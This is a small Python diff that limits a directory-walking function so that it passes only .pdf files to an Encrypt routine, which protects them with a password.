@@ -12,10 +12,11 @@ def getFile(password):
     for root, subdirs, files in os.walk(file_location): 
 
         for file in files:
-            print("file: " + file)
-            print("root: " + root)
-            print("subdirs: " + str(subdirs))
-            Encrypt(password, file, file_location, root)
+            if(Path(file).suffix == '.pdf'):
+                print("file: " + file)
+                print("root: " + root)
+                print("subdirs: " + str(subdirs))
+                Encrypt(password, file, file_location, root)
 
 
 def Encrypt(password, file, file_location, root):
